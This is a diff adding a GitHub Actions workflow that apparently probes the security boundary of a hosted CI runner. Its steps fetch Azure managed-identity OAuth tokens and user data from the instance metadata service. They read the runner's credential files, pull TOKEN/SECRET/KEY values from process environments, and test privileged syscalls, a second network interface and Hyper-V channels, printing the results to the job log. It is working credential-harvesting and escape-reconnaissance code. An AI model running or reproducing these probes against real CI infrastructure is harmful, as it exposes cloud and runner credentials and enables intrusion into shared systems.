@@ -1,0 +1,70 @@
+name: r2-boundary-probes
+on:
+  workflow_dispatch:
+jobs:
+  r2:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: imds-deep
+        run: |
+          set +e
+          echo "== identity token =="
+          curl -sS --max-time 6 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' | head -c 800; echo
+          echo "== identity token (graph) =="
+          curl -sS --max-time 6 -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/' | head -c 500; echo
+          echo "== attested doc =="
+          curl -sS --max-time 6 -H 'Metadata: true' 'http://169.254.169.254/metadata/attested/document?api-version=2021-02-01' | head -c 400; echo
+          echo "== userdata =="
+          curl -sS --max-time 6 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text' | head -c 600; echo
+          echo "== loadbalancer =="
+          curl -sS --max-time 6 -H 'Metadata: true' 'http://169.254.169.254/metadata/loadbalancer?api-version=2021-02-01' | head -c 400; echo
+          true
+      - name: actions-runner-dir
+        run: |
+          set +e
+          echo "== actions-runner ls =="
+          sudo ls -la /home/runner/actions-runner/ 2>&1 | head -30
+          echo "== dot-files =="
+          sudo ls -la /home/runner/actions-runner/.runner /home/runner/actions-runner/.credentials /home/runner/actions-runner/.credentials_rsaparams /home/runner/actions-runner/.agent 2>&1
+          echo "== .runner =="
+          sudo cat /home/runner/actions-runner/.runner 2>/dev/null
+          echo "== .credentials (first 200) =="
+          sudo head -c 200 /home/runner/actions-runner/.credentials 2>/dev/null; echo
+          echo "== listener env =="
+          for P in $(pgrep -f 'Runner.Listener|run.sh' | head -3); do echo "-- pid $P: $(cat /proc/$P/comm 2>/dev/null)"; sudo sh -c "tr '\0' '\n' < /proc/$P/environ" 2>/dev/null | grep -iE 'TOKEN|URL|SECRET|KEY|AGENT|RUNNER|POOL|QUEUE' | sed 's/\(TOKEN=.\{25\}\).*/\1.../' | head -15; done
+          echo "== worker env (runtime token target) =="
+          for P in $(pgrep -f 'Runner.Worker' | head -1); do sudo sh -c "tr '\0' '\n' < /proc/$P/environ" 2>/dev/null | grep -E 'ACTIONS_|GITHUB_' | sed 's/\(=.\{40\}\).*/\1.../' | head -20; done
+          true
+      - name: syscalls-ctypes
+        run: |
+          set +e
+          python3 - <<'PYEOF'
+          import ctypes
+          libc = ctypes.CDLL(None, use_errno=True)
+          def sc(nr, *a):
+              r = libc.syscall(ctypes.c_long(nr), *[ctypes.c_long(x) for x in a])
+              e = ctypes.get_errno()
+              print(f"syscall {nr} -> {r} errno {e}")
+              return r
+          print("== io_uring_setup(0,0) =="); sc(425, 0, 0)
+          print("== bpf(MAP_CREATE HASH) =="); sc(321, 0, 0, 0, 8, 0)
+          print("== perf_event_open =="); sc(298, 0, 2**64-1, 2**64-1, 0, 0)
+          print("== unshare(CLONE_NEWUSER=0x10000000) =="); sc(277, 0x10000000)
+          PYEOF
+          true
+      - name: net-deep
+        run: |
+          set +e
+          echo "== ens1 detail =="
+          sudo ip addr show ens1 2>&1 | head -8
+          echo "== ens1 dhcp attempt =="
+          sudo timeout 8 dhclient -v ens1 2>&1 | tail -5
+          sudo ip addr show ens1 | head -6
+          echo "== vmbus channels =="
+          ls /sys/bus/vmbus/devices 2>/dev/null | head -15
+          echo "== hv sockets =="
+          ls -la /dev/vmbus* 2>&1 | head -5
+          echo "== sshd config PermitRoot/Keys =="
+          sudo sshd -T 2>/dev/null | grep -iE 'permitroot|passwordauth|pubkey|authorizedkeysfile|listenaddress' | head -8
+          true
